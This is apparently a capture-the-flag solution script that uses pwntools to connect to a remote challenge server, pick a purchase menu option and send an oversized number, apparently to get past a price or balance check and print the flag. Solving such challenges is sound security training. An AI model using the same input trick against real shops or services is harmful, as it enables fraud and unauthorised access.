#!/usr/bin/python
from pwn import *
host = '140.113.24.241'
port = 30170
p = remote(host, port)
text = p.recvuntil(b'Input your choice:')
p.sendline(b'1')
p.recvline()
p.sendline(b'2222222222222222')
p.recvuntil(b'You have purchased the flag')
str = p.recvuntil(b'}')
print(str.decode())
p.close()